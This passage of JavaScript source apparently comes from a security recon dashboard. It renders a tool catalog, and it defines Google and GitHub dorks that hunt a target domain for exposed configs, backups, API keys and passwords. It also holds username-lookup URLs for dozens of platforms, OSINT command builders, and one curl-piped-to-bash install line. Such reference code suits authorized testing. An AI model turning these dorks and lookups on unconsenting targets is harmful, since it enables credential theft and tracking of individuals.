  if(htmlBox) htmlBox.style.display = 'none';
  csBox.style.display = 'none';

  let csFileUrl = t.csFile ? t.csFile.split(',')[0].trim() : '';
  if (csFileUrl.startsWith('/api/files/')) {
    const match = csFileUrl.match(/\/api\/files\/[a-f0-9]{32}_(.*_cs\.html)/);
    if (match) {
      csFileUrl = `/static/cheat_sheets/${match[1]}`;
    }
  }
  let isHtml = csFileUrl.toLowerCase().endsWith('.html') || csFileUrl.toLowerCase().endsWith('.htm');

  let htmlEmbed = t.cheatSheetHtml || '';
  if (htmlEmbed && htmlEmbed.includes('/api/files/')) {
    const match = htmlEmbed.match(/\/api\/files\/[a-f0-9]{32}_(.*_cs\.html)/);
    if (match) {
      htmlEmbed = htmlEmbed.replace(match[0], `/static/cheat_sheets/${match[1]}`);
    }
  }
  if (!htmlEmbed && isHtml) {
      htmlEmbed = `<iframe src="${esc(csFileUrl)}" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:500px; border:none; background: transparent;"></iframe>`;
  }

  if (htmlEmbed) {
    if(htmlBox) {
        htmlBox.style.display = 'block';
        htmlBox.innerHTML = htmlEmbed;
    }
  }
  
  if (t.cheatSheet) {
    csBox.style.display = 'block';
    csBox.style.whiteSpace = 'pre-wrap';
    csBox.style.padding = '16px';
    csBox.style.border = '1px solid var(--border)';
    csBox.style.background = 'var(--bg3)';
    csBox.textContent = t.cheatSheet;
  }

  if (csFileUrl && !isHtml && !t.cheatSheetHtml) {
    let isImg = csFileUrl.match(/\.(jpeg|jpg|gif|png|webp|svg)$/i);
    if (isImg) {
      csFileBox.style.display = 'block';
      csFileBox.innerHTML = `<img src="${esc(csFileUrl)}" style="max-width:100%; border-radius:var(--r); border:1px solid var(--border);" />`;
    } else {
      csFileBox.style.display = 'block';
      csFileBox.innerHTML = `<a href="${esc(csFileUrl)}" target="_blank" class="btn btn-primary" style="display:inline-flex; align-items:center; gap:8px;"><span style="font-size:16px;">📄</span> View Cheat Sheet File</a>`;
    }
  } else {
    csFileBox.style.display = 'none';
  }
  
  // Books
  const booksHeader = document.getElementById('td-books-header');
  const booksContainer = document.getElementById('td-books');
  if (t.books) {
    booksHeader.style.display = 'block';
    booksContainer.style.display = 'flex';
    let bList = typeof t.books === 'string' ? t.books.split(/,|\n/).filter(Boolean) : t.books;
    booksContainer.innerHTML = bList.map(b => {
      let bStr = b.trim();
      if(!bStr) return '';
      let isUrl = bStr.startsWith('http') || bStr.startsWith('/');
      let title = bStr;
      if (bStr.startsWith('/api/files/')) {
        title = bStr.split('/').pop();
        let firstUnderscore = title.indexOf('_');
        if(firstUnderscore > -1 && firstUnderscore < 35) {
           title = title.substring(firstUnderscore + 1);
        }
      }
      if (isUrl) {
         return `<a href="${esc(bStr)}" target="_blank" class="tool-resource-link"><span class="tool-resource-icon">📚</span> <span class="tool-resource-text">${esc(title)}</span></a>`;
      } else {
         return `<div class="tool-resource-link"><span class="tool-resource-icon">📚</span> <span class="tool-resource-text">${esc(title)}</span></div>`;
      }
    }).join('');
  } else {
    booksHeader.style.display = 'none';
    booksContainer.style.display = 'none';
  }
  
  // Videos
  const vidsHeader = document.getElementById('td-videos-header');
  const vidsContainer = document.getElementById('td-videos');
  if (t.videos) {
    vidsHeader.style.display = 'block';
    vidsContainer.style.display = 'grid'; // changed to grid
    let vList = typeof t.videos === 'string' ? t.videos.split(/,|\n|\s+/).filter(Boolean) : t.videos;
    vidsContainer.innerHTML = vList.map(v => {
      let vUrl = v.trim();
      if (!vUrl) return '';
      // Extract YT ID
      let match = vUrl.match(/(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=|shorts\/))([^&?\n]+)/);
      if (match && match[1]) {
        let ytId = match[1];
        return `<a href="${esc(vUrl)}" target="_blank" class="yt-thumb-card" title="Watch on YouTube">
                  <img src="https://img.youtube.com/vi/${ytId}/mqdefault.jpg" class="yt-thumb-img" loading="lazy">
                  <div class="yt-play-icon">▶</div>
                </a>`;
      } else {
        return `<a href="${esc(vUrl)}" target="_blank" class="tool-resource-link"><span class="tool-resource-icon">▶️</span> <span class="tool-resource-text">${esc(vUrl)}</span></a>`;
      }
    }).join('');
  } else {
    vidsHeader.style.display = 'none';
    vidsContainer.style.display = 'none';
  }
  
  document.getElementById('btn-edit-tool').onclick = () => editTool(idx);
  
  openModal('modal-tool-detail');
}

// ── Global state for tools search / filter ─────────────────────────────────
window.toolsSearchQuery = '';
window.toolsActiveCategory = 'all';

// Highlight helper — lives outside renderTools to avoid redefinition on every call
function _toolsHighlight(text, query) {
  if (!query || !text) return esc(text || '');
  const lText = text.toLowerCase();
  const lQuery = query.toLowerCase();
  const idx = lText.indexOf(lQuery);
  if (idx === -1) return esc(text);
  return esc(text.slice(0, idx)) +
    '<mark class="tools-search-highlight">' + esc(text.slice(idx, idx + query.length)) + '</mark>' +
    esc(text.slice(idx + query.length));
}

function setToolsCat(cat, btn) {
  window.toolsActiveCategory = cat;
  renderTools();
}

function clearToolsSearch() {
  const inp = document.getElementById('tools-search-input');
  if (inp) inp.value = '';
  window.toolsSearchQuery = '';
  renderTools();
  if (inp) inp.focus();
}

function renderTools() {

  const customList = S.customTools || [];

  

  // Auto-heal/restore cheatSheetHtml from built-in templates if overrides lack it

  customList.forEach(ct => {

    if (ct.isOverride || !ct.isCustom) {

      const builtIn = (window.tools || []).find(bt => bt.name.toLowerCase() === ct.name.toLowerCase());

      if (builtIn && builtIn.cheatSheetHtml && !ct.cheatSheetHtml) {

        ct.cheatSheetHtml = builtIn.cheatSheetHtml;

      }

    }

  });



  const customNames = new Set(customList.map(t => t.name.toLowerCase()));

  const builtInList = (window.tools || []).filter(t => !customNames.has(t.name.toLowerCase()));

  const list = customList.concat(builtInList);

  window._renderedToolsList = list;



  // ── Search + Category filter ────────────────────────────────────────────

  const q = (window.toolsSearchQuery || '').trim().toLowerCase();

  const activeCat = window.toolsActiveCategory || 'all';



  // Category counts across ALL tools (unfiltered, for pill badges)

  const catCounts = {};

  let catOrder = [

    'Recon & Discovery', 'Recon & OSINT',

    'DNS & Takeover', 'DNS & Subdomain Takeover',

    'HTTP & Crawling', 'HTTP Probing & Crawling',

    'Fuzzing', 'Fuzzing & Bruteforcing',

    'Discovery', 'Parameter & Secret Discovery',

    'Scanning', 'Vulnerability Scanning & Web Testing',

    'Brute Force', 'Credential Attacks',

    'Exploitation', 'Exploitation & Post-Exploitation',

    'Web Proxy & Interception',

    'Cloud & Infrastructure',

    'Pipelines & One-Liners'

  ];

  list.forEach(t => {

    const cat = t.tags && t.tags.length ? t.tags[0] : 'Other';

    catCounts[cat] = (catCounts[cat] || 0) + 1;

    if (!catOrder.includes(cat)) catOrder.push(cat); // Append any unknown categories at the end

  });

  

  // Filter out categories that have no tools (e.g. if custom tools are deleted)

  catOrder = catOrder.filter(c => catCounts[c] > 0);



  // Apply category filter

  let filtered = activeCat === 'all' ? list : list.filter(t => {

    const cat = t.tags && t.tags.length ? t.tags[0] : 'Other';

    return cat === activeCat;

  });



  // Apply text search

  if (q) {

    filtered = filtered.filter(t => {

      const hay = [t.name || '', t.desc || '', t.author || '', (t.tags || []).join(' '), t.cheatSheet || ''].join(' ').toLowerCase();

      return hay.includes(q);

    });

  }



  // ── Update result count badge ───────────────────────────────────────────

  const countEl = document.getElementById('tools-search-count');

  if (countEl) {

    const total = filtered.length;

    countEl.textContent = total + (total === 1 ? ' tool' : ' tools');

    countEl.className = 'tools-search-meta ' + (total === 0 ? 'no-results' : 'has-results');

  }



  // ── Clear button visibility ─────────────────────────────────────────────

  const clearBtn = document.getElementById('tools-search-clear');

  if (clearBtn) clearBtn.style.display = q ? 'flex' : 'none';



  const el = document.getElementById('tools-list');

  if (!el) return;



  // ── Rebuild pills (innerHTML approach — no duplication risk) ───────────

  const pillsEl = document.getElementById('tools-cat-pills');

  if (pillsEl) {

    const catEmoji = {

      'Recon & Discovery': '🔍', 'Recon & OSINT': '🔍',

      'DNS & Takeover': '🌐', 'DNS & Subdomain Takeover': '🌐',

      'HTTP & Crawling': '🕷️', 'HTTP Probing & Crawling': '🕷️',

      'Fuzzing': '💥', 'Fuzzing & Bruteforcing': '💥',

      'Discovery': '🔑', 'Parameter & Secret Discovery': '🔑',

      'Scanning': '🎯', 'Vulnerability Scanning & Web Testing': '🎯',

      'Exploitation': '⚡', 'Exploitation & Post-Exploitation': '⚡',

      'Cloud & Infrastructure': '☁️',

      'Web Proxy & Interception': '🔀', 

      'Brute Force': '🔓', 'Credential Attacks': '🔓',

      'Pipelines & One-Liners': '🔗',

    };

    // Short display labels

    const catShort = {

      'Recon & Discovery': 'Recon & Discovery',

      'Recon & Discovery': 'Recon & Discovery',

      'DNS & Takeover': 'DNS & Takeover',

      'DNS & Takeover': 'DNS & Takeover',

      'HTTP & Crawling': 'HTTP Probing',

      'HTTP & Crawling': 'HTTP Crawling',

      'Fuzzing': 'Fuzzing',

      'Fuzzing': 'Fuzzing',

      'Discovery': 'Params & Secrets',

      'Scanning': 'Vuln Scanning',

      'Exploitation': 'Exploitation',

      'Cloud & Infrastructure': 'Cloud',

      'Web Proxy & Interception': 'Web Proxy',

      'Brute Force': 'Credentials',

      'Brute Force': 'Brute Force',

      'Pipelines & One-Liners': 'Pipelines',

    };



    let pillsHTML = `<button id="tools-pill-all" class="tools-cat-pill${activeCat === 'all' ? ' active' : ''}" onclick="setToolsCat('all',this)">

      <span>⬡</span> All <span class="pill-count">${list.length}</span>

    </button>`;

    catOrder.forEach(cat => {

      const emoji = catEmoji[cat] || '🔧';

      const label = catShort[cat] || cat;

      const count = catCounts[cat] || 0;

      const isActive = activeCat === cat;

      const escapedCat = cat.replace(/\\/g, '\\\\').replace(/'/g, "\\'");

      pillsHTML += `<button class="tools-cat-pill${isActive ? ' active' : ''}" onclick="setToolsCat('${escapedCat}',this)" title="${esc(cat)}">

        <span>${emoji}</span>${esc(label)} <span class="pill-count">${count}</span>

      </button>`;

    });

    pillsEl.innerHTML = pillsHTML;

  }



  // ── Empty state ─────────────────────────────────────────────────────────

  if (filtered.length === 0) {

    el.innerHTML = `

      <div class="tools-empty-state">

        <div class="tools-empty-icon">🔍</div>

        <div class="tools-empty-title">No tools found</div>

        <div class="tools-empty-sub">

          No results for "<strong style="color:var(--accent)">${esc(q)}</strong>".<br>

          <button class="btn btn-sm" style="margin-top:10px;" onclick="clearToolsSearch()">✕ Clear Search</button>

        </div>

      </div>`;

    return;

  }



  // ── Group by category ───────────────────────────────────────────────────

  const grouped = {};

  filtered.forEach(t => {

    t._idx = list.indexOf(t);

    const cat = t.tags && t.tags.length ? t.tags[0] : 'Other';

    if (!grouped[cat]) grouped[cat] = [];

    grouped[cat].push(t);

  });



  const sortedCats = Object.keys(grouped).sort((a, b) => {

    let ia = catOrder.indexOf(a), ib = catOrder.indexOf(b);

    if (ia === -1) ia = 999;

    if (ib === -1) ib = 999;

    return ia - ib;

  });



  // ── Render ──────────────────────────────────────────────────────────────

  let html = '';

  for (const cat of sortedCats) {

    const tools = grouped[cat];

    html += `<div class="tools-category" style="margin-top:24px;">

      <h3 style="margin-bottom:12px;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:6px;">

        ${esc(cat)}

        <span style="font-size:12px;font-weight:500;color:var(--text3);margin-left:6px;">${tools.length} tool${tools.length !== 1 ? 's' : ''}</span>

      </h3>

      <div class="tools-grid">

        ${tools.map(t => `

          <div class="tool-movie-card" onclick="openToolDetail(${t._idx})">

            ${t.coverImg

              ? `<img src="${esc(t.coverImg)}" class="tool-movie-cover" loading="lazy" />`

              : `<div class="tool-movie-fallback" style="font-size:36px;font-weight:800;color:var(--accent);">${t.name ? esc(t.name.charAt(0).toUpperCase()) : '🔧'}</div>`}

            ${t.isCustom && !t.isOverride

              ? `<button class="btn btn-sm btn-danger" style="position:absolute;top:8px;right:8px;z-index:10;padding:4px 8px;font-size:14px;" onclick="event.stopPropagation();deleteCustomTool('${t.id}')" title="Delete">🗑</button>`

              : ''}

            ${t.isOverride

              ? `<button class="btn btn-sm" style="position:absolute;top:8px;right:8px;z-index:10;padding:4px 8px;font-size:14px;background:var(--bg3);border:1px solid var(--border);color:var(--text);" onclick="event.stopPropagation();deleteCustomTool('${t.id}')" title="Remove Override">↺</button>`

              : ''}

            <div class="tool-movie-overlay">

              <div class="tool-movie-title" title="${esc(t.name)}">${_toolsHighlight(t.name, q)}</div>

              <div class="tool-movie-author">${esc(t.author || 'Project / Community')}</div>

              <div class="tool-movie-tags">

                ${(t.tags || []).slice(0, 3).map(tag => `<span class="tool-movie-tag">${esc(tag)}</span>`).join('')}

              </div>

            </div>

          </div>

        `).join('')}

      </div>

    </div>`;

  }

  el.innerHTML = html;

}

window.osintActiveModule = window.osintActiveModule || 'domain';
window.osintActiveTab = window.osintActiveTab || 'google';
window.osintTargetDomain = window.osintTargetDomain || '';
window.osintTargetUsername = window.osintTargetUsername || '';
window.osintTargetEmail = window.osintTargetEmail || '';
window.osintTargetIP = window.osintTargetIP || '';
window.usernameCheckResults = window.usernameCheckResults || {};

const osintItems = {
  google: [
    { name: 'Directory Listing', desc: 'Find open directories exposing server files.', query: 'site:{{domain}} intitle:index.of' },
    { name: 'Config Files', desc: 'Find exposed database/app configurations.', query: 'site:{{domain}} ext:xml OR ext:conf OR ext:cnf OR ext:reg OR ext:inf OR ext:rdp OR ext:cfg OR ext:txt OR ext:ora OR ext:ini' },
    { name: 'Database Backups', desc: 'Find raw database backup dumps.', query: 'site:{{domain}} ext:sql OR ext:dbf OR ext:mdb OR ext:db' },
    { name: 'Public Documents', desc: 'Find publicly indexed office documents.', query: 'site:{{domain}} ext:pdf OR ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:ppt OR ext:pptx' },
    { name: 'Exposed Git Folder', desc: 'Find exposed git source repositories.', query: 'site:{{domain}} inurl:"/.git"' },
    { name: 'Backup & Old Files', desc: 'Find backup files or older server backups.', query: 'site:{{domain}} ext:bkf OR ext:bkp OR ext:bak OR ext:old OR ext:backup OR ext:temp' },
    { name: 'Setup & Installs', desc: 'Find setup wizard files or install routes.', query: 'site:{{domain}} inurl:setup OR inurl:install OR inurl:config' },
    { name: 'WordPress Paths', desc: 'Identify WordPress directory paths.', query: 'site:{{domain}} inurl:wp-content OR inurl:wp-includes' }
  ],
  github: [
    { name: 'API Key Exposure', desc: 'Search GitHub for hardcoded API keys.', query: 'site:github.com "{{domain}}" API_KEY OR api_key OR apikey' },
    { name: 'Hardcoded Passwords', desc: 'Search GitHub for database/user passwords.', query: 'site:github.com "{{domain}}" password OR passwd OR admin_password' },
    { name: 'JWT/Secret Tokens', desc: 'Search GitHub for cryptographic secret tokens.', query: 'site:github.com "{{domain}}" secret OR token OR private_key' },
    { name: 'Env Configs', desc: 'Search GitHub for exposed .env or config files.', query: 'site:github.com "{{domain}}" ext:env OR ext:yml OR ext:json' }
  ],
  intel: [
    { name: 'crt.sh Certificates', desc: 'Scan crt.sh public certificate logs for subdomains.', directUrl: 'https://crt.sh/?q={{domain}}' },
    { name: 'Shodan Passive Info', desc: 'Scan Shodan search logs for open ports and services.', directUrl: 'https://www.shodan.io/search?query={{domain}}' },
    { name: 'Censys Assets Info', desc: 'Scan Censys logs for certificates and hosts.', directUrl: 'https://search.censys.io/search?q={{domain}}' },
    { name: 'VirusTotal Analysis', desc: 'Check VirusTotal records for target domain history.', directUrl: 'https://www.virustotal.com/gui/domain/{{domain}}' },
    { name: 'Security Headers Test', desc: 'Analyze HTTP security headers deployment.', directUrl: 'https://securityheaders.com/?q={{domain}}' },
    { name: 'SSL Labs Analyzer', desc: 'Check SSL/TLS deployment rating.', directUrl: 'https://www.ssllabs.com/ssltest/analyze.html?d={{domain}}' }
  ],
  archives: [
    { name: 'Wayback Machine Calendar', desc: 'Explore historical page snapshots on Web Archive.', directUrl: 'https://web.archive.org/web/*/{{domain}}*' },
    { name: 'Wayback CDX API Index', desc: 'Fetch all indexed file paths from Web Archive.', directUrl: 'https://web.archive.org/cdx/search/cdx?url={{domain}}/*&output=text&fl=original&collapse=urlkey' },
    { name: 'Archive.is Mirrors', desc: 'Check for mirror/backup copies on archive.today.', directUrl: 'https://archive.is/{{domain}}' }
  ]
};

const usernamePlatforms = [
  { name: 'GitHub', icon: '🐙', url: 'https://github.com/{{username}}', probeUrl: 'https://api.github.com/users/{{username}}' },
  { name: 'Twitter/X', icon: '🐦', url: 'https://twitter.com/{{username}}' },
  { name: 'Reddit', icon: '🤖', url: 'https://reddit.com/user/{{username}}' },
  { name: 'Instagram', icon: '📷', url: 'https://instagram.com/{{username}}' },
  { name: 'Medium', icon: '✍️', url: 'https://medium.com/@{{username}}' },
  { name: 'Pinterest', icon: '📌', url: 'https://pinterest.com/{{username}}' },
  { name: 'Dev.to', icon: '💻', url: 'https://dev.to/{{username}}' },
  { name: 'HackerNews', icon: '🍊', url: 'https://news.ycombinator.com/user?id={{username}}', probeUrl: 'https://hacker-news.firebaseio.com/v0/user/{{username}}.json' },
  { name: 'GitLab', icon: '🦊', url: 'https://gitlab.com/{{username}}' },
  { name: 'Behance', icon: '🎨', url: 'https://behance.net/{{username}}' },
  { name: 'Dribbble', icon: '🏀', url: 'https://dribbble.com/{{username}}' },
  { name: 'Keybase', icon: '🔑', url: 'https://keybase.io/{{username}}' },
  { name: 'StackOverflow', icon: '🥞', url: 'https://stackoverflow.com/users/story/{{username}}' },
  { name: 'Steam', icon: '🎮', url: 'https://steamcommunity.com/id/{{username}}' },
  { name: 'Spotify', icon: '🎵', url: 'https://open.spotify.com/user/{{username}}' },
  { name: 'Patreon', icon: '💰', url: 'https://patreon.com/{{username}}' },
  { name: 'SlideShare', icon: '📊', url: 'https://slideshare.net/{{username}}' },
  { name: 'ProductHunt', icon: '😸', url: 'https://producthunt.com/@{{username}}' },
  { name: 'Wikipedia', icon: '📖', url: 'https://en.wikipedia.org/wiki/User:{{username}}' },
  { name: 'Flickr', icon: '🌸', url: 'https://flickr.com/people/{{username}}' },
  { name: 'Disqus', icon: '💬', url: 'https://disqus.com/by/{{username}}' },
  { name: 'DockerHub', icon: '🐳', url: 'https://hub.docker.com/u/{{username}}' },
  { name: 'Linktree', icon: '🌳', url: 'https://linktr.ee/{{username}}' },
  { name: 'YouTube', icon: '📺', url: 'https://youtube.com/@{{username}}' },
  { name: 'Twitch', icon: '🎮', url: 'https://twitch.tv/{{username}}' },
  { name: 'TikTok', icon: '🎵', url: 'https://tiktok.com/@{{username}}' },
  { name: 'Facebook', icon: '👥', url: 'https://facebook.com/{{username}}' },
  { name: 'LinkedIn', icon: '💼', url: 'https://linkedin.com/in/{{username}}' },
  { name: 'Telegram', icon: '✈️', url: 'https://t.me/{{username}}' },
  { name: 'Tumblr', icon: '📝', url: 'https://{{username}}.tumblr.com' },
  { name: 'Vimeo', icon: '📹', url: 'https://vimeo.com/{{username}}' },
  { name: 'SoundCloud', icon: '🎵', url: 'https://soundcloud.com/{{username}}' },
  { name: 'Substack', icon: '✍️', url: 'https://{{username}}.substack.com' },
  { name: 'TryHackMe', icon: '🔴', url: 'https://tryhackme.com/p/{{username}}' },
  { name: 'HackerOne', icon: '🎯', url: 'https://hackerone.com/{{username}}' },
  { name: 'Bugcrowd', icon: '🐝', url: 'https://bugcrowd.com/{{username}}' },
  { name: 'CodePen', icon: '✒️', url: 'https://codepen.io/{{username}}' },
  { name: 'Duolingo', icon: '🦉', url: 'https://www.duolingo.com/profile/{{username}}' },
  { name: 'Letterboxd', icon: '🎬', url: 'https://letterboxd.com/{{username}}' },
  { name: 'Google Search', icon: '🔍', url: 'https://www.google.com/search?q=%22{{username}}%22' },
  { name: 'Threads', icon: '🧵', url: 'https://www.threads.net/@{{username}}' },
  { name: 'Snapchat', icon: '👻', url: 'https://www.snapchat.com/add/{{username}}' },
  { name: 'Mastodon', icon: '🐘', url: 'https://mastodon.social/@{{username}}' },
  { name: 'Quora', icon: '❓', url: 'https://www.quora.com/profile/{{username}}' },
  { name: 'Clubhouse', icon: '🎙️', url: 'https://www.clubhouse.com/@{{username}}' },
  { name: 'About.me', icon: '👤', url: 'https://about.me/{{username}}' },
  { name: 'Vero', icon: '💎', url: 'https://vero.co/{{username}}' },
  { name: 'DeviantArt', icon: '🎨', url: 'https://www.deviantart.com/{{username}}' },
  { name: 'Wattpad', icon: '📚', url: 'https://www.wattpad.com/user/{{username}}' },
  { name: 'Goodreads', icon: '📖', url: 'https://www.goodreads.com/{{username}}' },
  { name: 'Foursquare', icon: '📍', url: 'https://foursquare.com/user/{{username}}' }
];

const cliToolsData = {
  sherlock: {
    name: 'sherlock',
    desc: 'Find usernames across over 350 social networks and online platforms.',
    install: 'git clone https://github.com/sherlock-project/sherlock.git\ncd sherlock\npip3 install -r requirements.txt',
    targetLabel: 'Username to search',
    defaultTarget: 'admin123',
    options: [
      { flag: '--timeout 5', label: 'Timeout (5s)', desc: 'Set socket timeout' },
      { flag: '--unique', label: 'Unique check', desc: 'Display only unique matches' },
      { flag: '--nsfw', label: 'NSFW sites', desc: 'Include adult/NSFW platforms' },
      { flag: '--csv', label: 'Export CSV', desc: 'Save output to a CSV file' }
    ],
    cmdBuilder: function(target, opts) {
      return `python3 sherlock.py ${target} ${opts.join(' ')}`;
    }
  },
  holehe: {
    name: 'holehe',
    desc: 'Check if an email is registered on 120+ websites (social, shopping, etc.) by analyzing password recovery flows.',
    install: 'pip3 install holehe',
    targetLabel: 'Email address to check',
    defaultTarget: 'user@domain.com',
    options: [
      { flag: '--only-used', label: 'Only Registered', desc: 'Only display sites where the email was found' },
      { flag: '--sniff', label: 'Sniff mode', desc: 'Perform deeper checks with passive sniffing' }
    ],
    cmdBuilder: function(target, opts) {
      return `holehe ${target} ${opts.join(' ')}`;
    }
  },
  amass: {
    name: 'amass',
    desc: 'OWASP Amass parses DNS logs, search engines, and registries to map corporate networks and external assets.',
    install: 'go install -v github.com/owasp-amass/amass/v4/...@master',
    targetLabel: 'Target domain',
    defaultTarget: 'target.com',
    options: [
      { flag: '-passive', label: 'Passive Mode', desc: 'Do not perform active resolution/scans' },
      { flag: '-ip', label: 'Show IPs', desc: 'Show resolved IP addresses for names' },
      { flag: '-src', label: 'Print Sources', desc: 'Show which OSINT source provided the subdomain' },
      { flag: '-active', label: 'Active scan', desc: 'Perform DNS zone transfers and port scans' }
    ],
    cmdBuilder: function(target, opts) {
      return `amass enum -d ${target} ${opts.join(' ')}`;
    }
  },
  subfinder: {
    name: 'subfinder',
    desc: 'Subfinder is a fast subdomain discovery tool that utilizes passive online sources to fetch valid subdomains.',
    install: 'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
    targetLabel: 'Target domain',
    defaultTarget: 'target.com',
    options: [
      { flag: '-silent', label: 'Silent mode', desc: 'Only display subdomains in output' },
      { flag: '-all', label: 'Query all sources', desc: 'Use all passive sources (slow)' },
      { flag: '-recursive', label: 'Recursive discovery', desc: 'Query subdomains of subdomains' }
    ],
    cmdBuilder: function(target, opts) {
      return `subfinder -d ${target} ${opts.join(' ')}`;
    }
  },
  theharvester: {
    name: 'theHarvester',
    desc: 'Gathers e-mails, subdomains, names, open ports and banners from 20+ public data sources.',
    install: 'git clone https://github.com/laramies/theHarvester.git\npip3 install -r requirements/base.txt',
    targetLabel: 'Target domain',
    defaultTarget: 'target.com',
    options: [
      { flag: '-b all', label: 'All sources', desc: 'Use all search engines and registries' },
      { flag: '-l 500', label: 'Limit (500)', desc: 'Limit the number of search results' },
      { flag: '-v', label: 'Verify hostnames', desc: 'Perform DNS resolution on found hosts' }
    ],
    cmdBuilder: function(target, opts) {
      return `python3 theHarvester.py -d ${target} ${opts.join(' ')}`;
    }
  },
  phoneinfoga: {
    name: 'phoneinfoga',
    desc: 'Information gathering and OSINT tool for phone numbers. Detects country, carrier, and leaks.',
    install: 'curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/install | bash',
    targetLabel: 'Phone (with country code, e.g. 15556667777)',
    defaultTarget: '15556667777',
    options: [
      { flag: '--scanner numverify', label: 'Numverify', desc: 'Query details from Numverify API' },
      { flag: '--scanner ovh', label: 'OVH Scanner', desc: 'Use OVH VoIP registry check' }
    ],
    cmdBuilder: function(target, opts) {
      return `phoneinfoga scan -n ${target} ${opts.join(' ')}`;
    }
  },
  spiderfoot: {
    name: 'spiderfoot',
    desc: 'Automates OSINT scanning. Queries over 100 public data sources for threat intelligence data.',
    install: 'git clone https://github.com/smicallef/spiderfoot.git\npip3 install -r requirements.txt',
    targetLabel: 'Target (IP, domain, email)',
    defaultTarget: 'target.com',
    options: [
      { flag: '-m sfp_dns,sfp_whois', label: 'Basic Recon', desc: 'Only run DNS and WHOIS modules' },
      { flag: '-m sfp_haveibeenpwned', label: 'Breach only', desc: 'Only check haveibeenpwned email database' },
      { flag: '-o csv', label: 'Export CSV', desc: 'Output scanning results in CSV format' }
    ],
    cmdBuilder: function(target, opts) {
      return `python3 sf.py -s ${target} ${opts.join(' ')}`;
    }
  },
  gowitness: {
    name: 'gowitness',
    desc: 'gowitness is a website screenshot utility written in Golang, using Chrome Headless to generate screenshots.',
    install: 'go install github.com/sensepost/gowitness@latest',
    targetLabel: 'Target URL or Domain',
    defaultTarget: 'http://target.com',
    options: [
      { flag: '--resolution-x 1440', label: '1440p Width', desc: 'Screenshot width resolution' },
      { flag: '--resolution-y 900', label: '900p Height', desc: 'Screenshot height resolution' },
      { flag: '--disable-db', label: 'No Database', desc: 'Do not save screenshots metadata in SQLite' }
    ],
    cmdBuilder: function(target, opts) {
      return `gowitness single ${target} ${opts.join(' ')}`;
    }
  },
  dnsrecon: {
    name: 'dnsrecon',
    desc: 'DNSRecon is a Python script that enables standard DNS queries, Zone Transfers, reverse lookups, and cache snooping.',
    install: 'pip3 install dnsrecon\n# Or: git clone https://github.com/darkoperator/dnsrecon.git',
    targetLabel: 'Target Domain',
    defaultTarget: 'target.com',
    options: [
      { flag: '-t std', label: 'Standard Scan', desc: 'Run standard enumeration including MX, NS, A, SOA, and TXT checks' },
      { flag: '-a', label: 'Zone Transfer', desc: 'Attempt AXFR zone transfer enumeration on all nameservers' },
      { flag: '-g', label: 'Google Scraping', desc: 'Scrape Google search results to discover host subdomains' },
      { flag: '--xml export.xml', label: 'XML Export', desc: 'Save scanning outputs into a structured XML report' }
    ],
    cmdBuilder: function(target, opts) {
      return `dnsrecon -d ${target} ${opts.join(' ')}`;
    }
  },
  whois: {
    name: 'whois',
    desc: 'A CLI client for querying domain registration records from WHOIS servers.',
    install: 'sudo apt install whois\n# Available out-of-the-box on most Unix-like systems',
    targetLabel: 'Target Domain / IP',
    defaultTarget: 'target.com',
    options: [
      { flag: '-h whois.iana.org', label: 'IANA Server', desc: 'Force query through the root registry database' },
      { flag: '-I', label: 'Lookup ASN info', desc: 'Request routing/autonomous system details for IP blocks' }
    ],
    cmdBuilder: function(target, opts) {
      return `whois ${opts.join(' ')} ${target}`;
    }
  }
};

const exifTags = {
  0x010E: 'ImageDescription',
  0x010F: 'Make',
  0x0110: 'Model',
  0x0112: 'Orientation',
  0x011A: 'XResolution',
  0x011B: 'YResolution',
  0x0128: 'ResolutionUnit',
  0x0131: 'Software',
  0x0132: 'DateTime',
  0x013B: 'Artist',
  0x8298: 'Copyright',
  0x829A: 'ExposureTime',
  0x829D: 'FNumber',
  0x8822: 'ExposureProgram',
  0x8827: 'ISOSpeedRatings',
  0x9000: 'ExifVersion',
  0x9003: 'DateTimeOriginal',
  0x9004: 'DateTimeDigitized',
  0x920A: 'FocalLength',
  0x9286: 'UserComment',
  0xA405: 'FocalLengthIn35mmFilm',
  0xA433: 'LensMake',
  0xA434: 'LensModel',
  0x8825: 'GPSInfo'
};

const gpsTags = {
  0x0001: 'GPSLatitudeRef',
  0x0002: 'GPSLatitude',
  0x0003: 'GPSLongitudeRef',
  0x0004: 'GPSLongitude'
};

// Simple MD5 Implementation
function md5(string) {
  function RotateLeft(lValue, iShiftBits) {
    return (lValue<<iShiftBits) | (lValue>>>(32-iShiftBits));
  }
  function AddUnsigned(lX,lY) {
    var lX4,lY4,lX8,lY8,lXResult;
    lX8 = (lX & 0x80000000);
    lY8 = (lY & 0x80000000);
    lX4 = (lX & 0x40000000);
    lY4 = (lY & 0x40000000);
    lXResult = (lX & 0x3FFFFFFF)+(lY & 0x3FFFFFFF);
    if (lX4 & lY4) {
      return (lXResult ^ 0x80000000 ^ lX8 ^ lY8);
    }
    if (lX4 | lY4) {
      if (lXResult & 0x40000000) {
        return (lXResult ^ 0xC0000000 ^ lX8 ^ lY8);
      } else {
        return (lXResult ^ 0x40000000 ^ lX8 ^ lY8);
      }
    } else {
      return (lXResult ^ lX8 ^ lY8);
    }
  }
  function F(x,y,z) { return (x & y) | ((~x) & z); }
  function G(x,y,z) { return (x & z) | (y & (~z)); }
  function H(x,y,z) { return (x ^ y ^ z); }
  function I(x,y,z) { return (y ^ (x | (~z))); }
  function II(a,b,c,d,x,s,ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b,c,d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  }
  function GG(a,b,c,d,x,s,ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b,c,d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  }
  function HH(a,b,c,d,x,s,ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b,c,d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  }
  function II2(a,b,c,d,x,s,ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b,c,d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  }
  function ConvertToWordArray(string) {
    var lWordCount;
    var lMessageLength = string.length;
    var lNumberOfWords_temp1 = lMessageLength + 8;
